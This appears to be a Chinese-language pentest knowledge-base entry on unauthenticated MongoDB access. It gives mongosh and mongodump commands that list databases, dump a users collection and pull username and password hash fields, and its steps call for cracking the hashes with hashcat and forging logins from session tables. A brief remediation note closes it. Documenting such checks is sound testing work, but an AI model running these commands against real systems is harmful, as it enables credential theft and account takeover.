---
title: MongoDB 未授权访问（直接拖库）
cve: 无（配置缺陷）
severity: critical
cvss: 9.0
product: MongoDB
versions: 任意（未启认证）
ports: 27017
keywords: mongodb, 未授权, 拖库, 数据库, nosql
entry: mongod 无 auth 且对外开放
verified: false
sources: 公开资料整理（配置缺陷类）
---

## 指纹

```
nc -vz target 27017
mongosh "mongodb://target:27017" --eval 'db.adminCommand({listDatabases:1})'
```

## 前置条件

- mongod 未启 `--auth` 且监听 0.0.0.0。

## PoC

```bash
# 1) 列库
mongosh "mongodb://target:27017" --quiet --eval 'db.adminCommand({listDatabases:1}).databases.map(d=>d.name)'

# 2) 导一个集合（只取 5 条证明）
mongodump "mongodb://target:27017/app" --collection=users --out=/tmp/mg --limit=5
ls -la /tmp/mg/app/users.bson

# 3) 找管理员凭据
mongosh "mongodb://target:27017/app" --quiet --eval 'db.users.find({},{username:1,password:1}).limit(3).toArray()'
# 判定：拿到 username/password 哈希 = 命中
```

## 利用步骤

1. 先 listDatabases（只读）；
2. 挑业务库（app/member/admin），取 5 条；
3. 哈希转 hashcat；会话表可直接伪造登录；
4. 证据：库名 + 集合名 + 一条记录（脱敏）。

## 修复与缓解

- 开 auth + 强口令；只监听内网；禁 `$where`。

## 参考

- MongoDB 安全清单。
